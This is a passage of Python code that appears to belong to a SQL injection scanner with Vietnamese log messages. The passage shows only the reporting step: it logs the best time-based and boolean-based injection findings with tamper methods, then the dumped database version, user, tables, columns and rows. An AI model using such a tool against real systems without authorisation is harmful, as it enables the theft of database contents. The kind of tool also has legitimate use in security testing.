                    _log(f" Độ tin cậy: {best_time['confidence']}", "DEBUG")
            if bool_count > 0:
                best_bool = res["boolean"][0] if res["boolean"] else None
                if best_bool:
                    _log(" Boolean-based tốt nhất:", "INFO")
                    _log(f" Phương pháp: {best_bool['payload_desc']}", "DEBUG")
                    _log(f" Tamper: {best_bool['tamper']}", "DEBUG")
                    _log(f" Độ tin cậy: {best_bool['confidence']}", "DEBUG")
            if "dump" in res and res["dump"]:
                _log("Dump Summary for parameter {param}:", "SUMMARY")
                for db, data in res["dump"].items():
                    _log(f"  DB: {db}", "INFO")
                    if "version" in data:
                        _log(f"    Version: {data['version']}", "DEBUG")
                    if "current_db" in data:
                        _log(f"    Current DB: {data['current_db']}", "DEBUG")
                    if "current_user" in data:
                        _log(f"    Current User: {data['current_user']}", "DEBUG")
                    if "tables" in data:
                        for table, tdata in data["tables"].items():
                            _log(f"    Table: {table}", "TABLE")
                            if "columns" in tdata:
                                _log(f"      Columns: {tdata['columns']}", "COLUMN")
                            if "rows" in tdata:
                                _log(f"      Rows: {tdata['rows']}", "ROW")
    _log("Quét hoàn tất!", "DONE")
    set_log_func(None)
    return {"target": target_url, "method": request_method, "results": results}